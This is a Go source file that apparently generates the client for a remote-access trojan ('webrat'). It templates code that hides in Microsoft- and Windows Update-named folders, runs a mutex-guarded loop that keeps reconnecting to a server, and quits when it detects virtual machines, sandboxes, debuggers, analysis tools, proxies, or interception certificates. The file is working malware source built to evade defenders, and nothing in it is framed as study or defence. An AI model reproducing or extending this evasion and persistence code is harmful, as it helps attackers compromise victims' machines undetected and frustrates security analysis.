package buildergen

import (
	"fmt"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))
	disguiseDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) || strings.HasPrefix(exePathLower, disguiseDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	rand.Seed(time.Now().UnixNano())

	for {
		connectToServer()
		time.Sleep(5 * time.Second)
	}
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func checkAntiVps() {
	if runtime.GOOS != "windows" {
		return
	}

	vmProcesses := []string{
		"VBoxService.exe",
		"VBoxTray.exe",
		"vmtoolsd.exe",
		"VMwareTray.exe",
		"VMwareUser.exe",
		"vmware.exe",
		"vmware-vmx.exe",
		"prl_tools.exe",
		"prl_cc.exe",
		"qemu-ga.exe",
		"vmsrvc.exe",
		"vboxservice.exe",
		"vboxtray.exe",
		"xenservice.exe",
		"joeboxcontrol.exe",
		"joeboxserver.exe",
		"cuckoomon.exe",
		"cuckoo.exe",
		"prl_tools_service.exe",
		"vdagent.exe",
		"vdservice.exe",
		"windanr.exe",
	}
	for _, p := range vmProcesses {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	sandboxProcs := []string{
		"SandboxieRpcSs.exe",
		"SandboxieDcomLaunch.exe",
		"SbieSvc.exe",
		"procmon.exe",
		"procmon64.exe",
		"wireshark.exe",
		"fiddler.exe",
		"ollydbg.exe",
		"idaq.exe",
		"idaq64.exe",
		"x64dbg.exe",
		"x32dbg.exe",
		"windbg.exe",
		"dnSpy.exe",
		"de4dot.exe",
		"ilspy.exe",
		"dotPeek32.exe",
		"dotPeek64.exe",
		"pestudio.exe",
		"processhacker.exe",
		"autoruns.exe",
		"autorunsc.exe",
		"regmon.exe",
		"filemon.exe",
		"tcpview.exe",
		"Rachael.exe",
		"DVTAP.exe",
		"analyzer.exe",
	}
	for _, p := range sandboxProcs {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	vmFiles := []string{
		"C:\\Windows\\System32\\VBox*.dll",
		"C:\\Windows\\System32\\VBoxHook.dll",
		"C:\\Windows\\System32\\VBoxGuest.sys",
		"C:\\Windows\\System32\\VBoxMouse.sys",
		"C:\\Windows\\System32\\VBoxSF.sys",
		"C:\\Windows\\System32\\vmGuestLib.dll",
		"C:\\Windows\\System32\\vm3dgl.dll",
		"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxService.exe",
		"C:\\Windows\\System32\\drivers\\vmmouse.sys",
		"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
		"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
		"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
		"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
		"C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
	}
	for _, pattern := range vmFiles {
		if checkFileExists(pattern) {
			os.Exit(1)
		}
	}

	if runtime.NumCPU() < 2 {
		os.Exit(1)
	}

	checkLowRAM()
	checkSmallDisk()
	checkLowUptime()
	checkSandboxUser()
	checkVMRegistry()
	checkLowScreenRes()
	checkVMMacAddress()
	checkRecentFiles()
}

func checkLowRAM() {
	var memInfo [8 * 8]byte
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc("GlobalMemoryStatusEx")
	*(*uint32)(unsafe.Pointer(&memInfo[0])) = uint32(len(memInfo))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memInfo[0])))
	if ret == 0 {
		return
	}
	totalPhys := *(*uint64)(unsafe.Pointer(&memInfo[8]))
	gb := totalPhys / (1024 * 1024 * 1024)
	if gb < 2 {
		os.Exit(1)
	}
}

func checkSmallDisk() {
	var freeBytesAvail, totalBytes, totalFree uint64
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc("GetDiskFreeSpaceExW")
	pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ := proc.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeBytesAvail)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFree)),
	)
	if ret == 0 {
		return
	}
	gb := totalBytes / (1024 * 1024 * 1024)
	if gb < 50 {
		os.Exit(1)
	}
}

func checkLowUptime() {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc("GetTickCount64")
	ret, _, _ := proc.Call()
	uptimeMs := uint64(ret)
	uptimeMin := uptimeMs / 60000
	if uptimeMin < 10 {
		os.Exit(1)
	}
}

func checkSandboxUser() {
	u, err := user.Current()
	if err != nil {
		return
	}
	name := strings.ToLower(u.Username)
	parts := strings.Split(name, "\\")
	if len(parts) > 1 {
		name = parts[len(parts)-1]
	}
	sandboxNames := []string{
		"sandbox", "virus", "malware", "maltest",
		"test", "john", "user", "currentuser",
		"sand box", "tester", "cuckoo", "vmware",
		"vbox", "qemu", "analysis", "sample",
		"default", "infected", "pc",
	}
	for _, s := range sandboxNames {
		if name == s {
			os.Exit(1)
		}
	}
	hostname, _ := os.Hostname()
	hostLower := strings.ToLower(hostname)
	sandboxHosts := []string{
		"sandbox", "malware", "virus", "analysis",
		"sample", "cuckoo", "testpc", "desktop-",
	}
	for _, s := range sandboxHosts {
		if strings.Contains(hostLower, s) && s != "desktop-" {
			os.Exit(1)
		}
	}
}

func checkVMRegistry() {
	vmKeys := []struct {
		root uint32
		path string
	}{
		{0x80000002, "SOFTWARE\\VMware, Inc.\\VMware Tools"},
		{0x80000002, "SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
		{0x80000001, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxService"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxSF"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmci"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmhgfs"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\vmmouse"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VMTools"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL"},
		{0x80000002, "SYSTEM\\CurrentControlSet\\Services\\Xen*"},
	}
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	regCloseKey := advapi32.NewProc("RegCloseKey")
	for _, vk := range vmKeys {
		pathPtr, _ := syscall.UTF16PtrFromString(vk.path)
		var hKey syscall.Handle
		ret, _, _ := regOpenKeyEx.Call(
			uintptr(vk.root),
			uintptr(unsafe.Pointer(pathPtr)),
			0,
			uintptr(0x20019),
			uintptr(unsafe.Pointer(&hKey)),
		)
		if ret == 0 {
			regCloseKey.Call(uintptr(hKey))
			os.Exit(1)
		}
	}
}

func checkLowScreenRes() {
	user32 := syscall.NewLazyDLL(getUser32DLL())
	getMetrics := user32.NewProc("GetSystemMetrics")
	w, _, _ := getMetrics.Call(0)
	h, _, _ := getMetrics.Call(1)
	if w < 800 || h < 600 {
		os.Exit(1)
	}
}

func checkVMMacAddress() {
	ifaces, err := net.Interfaces()
	if err != nil {
		return
	}
	vmPrefixes := []string{
		"00:05:69", "00:0c:29", "00:1c:14", "00:50:56",
		"08:00:27", "00:1c:42", "52:54:00", "00:16:3e",
		"00:03:ff", "02:42:ac",
	}
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) == 0 {
			continue
		}
		mac := strings.ToLower(iface.HardwareAddr.String())
		if len(mac) < 8 {
			continue
		}
		prefix := mac[:8]
		for _, vp := range vmPrefixes {
			if prefix == vp {
				os.Exit(1)
			}
		}
	}
}

func checkRecentFiles() {
	recentDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentDir)
	if err != nil {
		return
	}
	if len(entries) < 10 {
		os.Exit(1)
	}
}

func checkAntiMitm() {
	if runtime.GOOS != "windows" {
		return
	}

	if hasProxyConfigured() {
		os.Exit(1)
	}

	mitmProcs := []string{
		"Fiddler.exe",
		"FiddlerEverywhere.exe",
		"Charles.exe",
		"BurpSuite.exe",
		"burp.exe",
		"mitmproxy.exe",
		"Proxifier.exe",
		"HTTPDebuggerUI.exe",
		"HTTPDebuggerSvc.exe",
		"sslsplit.exe",
		"sslproxy.exe",
		"zap.exe",
		"OWASPZAP.exe",
		"SmartSniff.exe",
		"HttpAnalyzerStd.exe",
		"RawCap.exe",
		"NetworkMiner.exe",
		"GlassWire.exe",
		"Tcpdump.exe",
		"PacketCapture.exe",
		"NetworkMonitor.exe",
	}
	for _, p := range mitmProcs {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	checkMitmCerts()
}

func hasProxyConfigured() bool {
	for _, key := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
		if v := strings.TrimSpace(os.Getenv(key)); v != "" {
			if _, err := url.Parse(v); err == nil {
				return true
			}
		}
	}

	cmd := exec.Command("netsh", "winhttp", "show", "proxy")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()

	if err == nil {
		text := strings.ToLower(string(out))
		if strings.Contains(text, "proxy server") && text != "" && !strings.Contains(text, "direct access") {
			return true
		}
	}

	return false
}

func checkMitmCerts() {
	cmd := exec.Command("certutil", "-store", "Root")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return
	}
	text := strings.ToLower(string(out))
	mitmIssuers := []string{
		"fiddler", "charles", "burp", "mitmproxy",
		"portswigger", "owasp", "zap proxy",
		"do_not_trust", "insecure",
	}
	for _, issuer := range mitmIssuers {
		if strings.Contains(text, issuer) {
			os.Exit(1)
		}
	}
}

func checkFileExists(pattern string) bool {
	matches, err := filepath.Glob(pattern)
	return err == nil && len(matches) > 0
}

func checkProcessRunning(processName string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %%s", processName), "/NH")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()

	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName)
}

func setupLogger() *os.File { return nil }
`, delay, buildID, buildID))
}